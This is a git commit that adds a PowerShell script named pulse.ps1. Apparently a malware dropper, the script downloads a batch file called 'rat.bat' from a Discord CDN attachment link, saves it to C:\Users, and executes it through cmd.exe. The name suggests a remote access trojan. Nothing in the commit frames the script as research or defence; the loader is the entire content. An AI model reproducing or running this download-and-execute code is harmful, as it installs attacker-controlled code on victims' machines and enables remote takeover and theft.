71c4232a2c766c84bbf6aeda98be5c9bed7b8d05
Kaught <89326272+Kaughts@users.noreply.github.com>
2024-05-18 18:38:19 -0700

    Add files via upload

---
+++ pulse.ps1
@@ -0,0 +1,16 @@
+# Define the URL of the batch file
+$batchFileUrl = "https://cdn.discordapp.com/attachments/1223133700846391296/1241562344996343808/rat.bat?ex=664aa68a&is=6649550a&hm=7b6101fd77c5665be9372731fd20939fbcf83f5a13de3dfb08cc3acda60a46d0&"
+
+# Define the local path where the batch file will be saved
+$localPath = "C:\Users\bat.bat"
+
+# Download the batch file
+Invoke-WebRequest -Uri $batchFileUrl -OutFile $localPath
+
+# Check if the batch file exists before attempting to run it
+if (Test-Path $localPath) {
+    # Execute the batch file
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $localPath"
+} else {
+    
+}
